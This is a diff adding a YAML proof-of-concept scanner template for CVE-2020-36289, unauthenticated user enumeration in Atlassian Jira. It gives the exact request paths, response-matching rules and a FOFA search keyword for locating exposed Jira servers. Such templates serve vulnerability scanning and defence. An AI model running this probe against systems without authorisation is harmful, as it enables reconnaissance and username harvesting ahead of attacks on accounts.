@@ -1,0 +1,23 @@
+name: poc-yaml-Atlassian-Jira-Unauth-User-Enumeration
+manual: true
+transport: http
+rules:
+    r10:
+        request:
+            cache: true
+            method: GET
+            path: /secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin
+        expression: response.status == 200 && response.body.bcontains(b"rel=") && response.body.bcontains(b"assignee") && response.headers["Content-Type"].contains(string("application/json"))
+    r20:
+        request:
+            cache: true
+            method: GET
+            path: /jira/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin
+        expression: response.status == 200 && response.body.bcontains(b"rel=") && response.body.bcontains(b"Assignee") && response.headers["Content-Type"].contains(string("application/json"))
+expression: r10() || r20()
+detail:
+    author: cysec
+    links:
+        - http://cysec.com
+    fofakeyword: app="jira"
+    vulninfo: CVE-2020-36289
